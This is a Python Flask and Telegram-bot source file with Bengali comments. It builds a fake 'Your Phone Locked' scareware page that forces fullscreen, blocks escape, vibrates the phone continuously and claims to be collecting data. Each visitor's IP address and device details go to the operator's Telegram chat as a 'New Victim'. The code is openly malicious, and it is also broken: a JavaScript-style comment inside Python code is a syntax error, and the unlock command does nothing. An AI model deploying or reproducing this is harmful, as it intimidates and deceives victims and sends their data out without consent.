import os
from flask import Flask, request, jsonify, render_template_string
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

app = Flask(__name__)

# রেন্ডারের এনভায়রনমেন্ট ভেরিয়েবল থেকে টোকেন এবং আইডি নেওয়া
# আপনি রেন্ডারে সেটআপ করার সময় এগুলো সেট করবেন
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

bot = telebot.TeleBot(BOT_TOKEN)

# ভিক্টিমের ডেটা স্টোর করার লিস্ট
victims = []

# --- হোম পেজ (ভিক্টিমের ফোনে দেখাবে) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Cyber Security Team</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000000;
            color: #ffffff;
            font-family: 'Courier New', Courier, monospace;
            overflow: hidden; /* স্ক্রল বার লুকানো */
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
        }
        .container {
            width: 90%;
        }
        h1 {
            font-size: 24px;
            color: #ff3333;
            text-transform: uppercase;
            border: 2px solid #ff3333;
            padding: 10px;
            margin-bottom: 20px;
            box-shadow: 0 0 15px #ff3333;
        }
        p {
            font-size: 18px;
            margin: 10px 0;
        }
        .lock-icon {
            font-size: 60px;
            margin-bottom: 20px;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.1); opacity: 0.8; }
            100% { transform: scale(1); opacity: 1; }
        }
        /* ফুল স্ক্রিন মোডে যাওয়ার জন্য */
        .fullscreen-btn {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #ff3333;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            z-index: 100;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="lock-icon">🔒</div>
        <h1>Your Phone Locked</h1>
        <p>By Cyber Security Team</p>
        <p id="status">Collecting Data...</p>
        <p style="font-size: 12px; color: #888;">Do not close this window!</p>
    </div>

    <script>
        // ১. ফুল স্ক্রিন মোডে যাওয়া (যতক্ষণ সম্ভব)
        function goFullscreen() {
            var elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.webkitRequestFullscreen) { /* Safari */
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) { /* IE11 */
                elem.msRequestFullscreen();
            }
        }

        // পেজ লোড হওয়ার সাথে সাথে ফুল স্ক্রিন এবং ভাইব্রেশন
        window.onload = function() {
            goFullscreen();
            
            // ভাইব্রেশন চালু রাখা (যদি ডিভাইস সাপোর্ট করে)
            if ('vibrate' in navigator) {
                setInterval(function() {
                    navigator.vibrate([200, 100, 200]); // ২০০ms ভাইব, ১০০ms বিরতি, ২০০ms ভাইব
                }, 500);
            }

            // ডেটা পাঠানো
            fetch('/send_data', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    document.getElementById('status').innerText = "Data Sent Successfully";
                    document.getElementById('status').style.color = "#00ff00";
                });

            // প্রতি ৫ সেকেন্ডে পিং পাঠানো (যাতে সাইট ঘুমিয়ে না যায়)
            setInterval(function() {
                fetch('/ping');
            }, 5000);
        };

        // ESC বাটন চাপলে আবার ফুল স্ক্রিনে আসবে
        document.addEventListener('keydown', function(event) {
            if (event.key === "Escape") {
                goFullscreen();
            }
        });
    </script>
</body>
</html>
"""

# --- রুটস এবং API ---

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/send_data', methods=['POST'])
def send_data():
    # ভিক্টিমের IP এবং ডিভাইস ইনফো নেওয়া
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    # ডেটা অ্যারেতে যোগ করা
    victim_info = {
        "ip": ip,
        "device": user_agent.split(')')[0] + ')',  // ডিভাইস নাম বের করা
        "time": str(request.timestamp) if hasattr(request, 'timestamp') else "Unknown"
    }
    victims.append(victim_info)

    # টেলিগ্রামে মেসেজ পাঠানো
    message = f"🔥 **New Victim Detected!**\n\n📱 IP: `{ip}`\n📲 Device: `{user_agent[:50]}...`\n\nUse /unlock to reset."
    
    try:
        bot.send_message(CHAT_ID, message, parse_mode="Markdown")
    except Exception as e:
        print(f"Error sending telegram msg: {e}")

    return jsonify({"status": "success", "message": "Data captured"})

@app.route('/ping')
def ping():
    # সাইটকে অ্যাক্টিভ রাখার জন্য শুধু 'ok' রিটার্ন করবে
    return "ok"

# --- টেলিগ্রাম বট কমান্ড ---

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome Admin. Use /unlock to notify victims.")

@bot.message_handler(commands=['unlock'])
def unlock_devices(message):
    # শুধু এডমিনের চ্যাট আইডি হলেই কাজ করবে (নিরাপত্তা)
    if str(message.chat.id) == CHAT_ID:
        bot.reply_to(message, "✅ **System Unlocked!**\nAll victims will receive a notification.")
        
        # ভিক্টিমদের জানাতে একটি মেসেজ পাঠানো (এখানে আমরা সব ভিক্টিমকে পার্সোনালি মেসেজ দিতে পারি, 
        # কিন্তু সহজ রাখার জন্য আমরা স্ট্যাটাস আপডেট করছি)।
        # নোট: ব্রাউজার থেকে সরাসরি পুশ নোটিফিকেশন দেওয়া কঠিন তাই আমরা মেসেজ পাঠাই।
        
    else:
        bot.reply_to(message, "🚫 Access Denied! You are not Admin.")

# --- প্রোগ্রাম চালু করা ---
if __name__ == '__main__':
    # রেন্ডারে পোর্ট ডাইনামিকভাবে নেয়, তাই os.environ.get('PORT') ব্যবহার করা ভালো
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
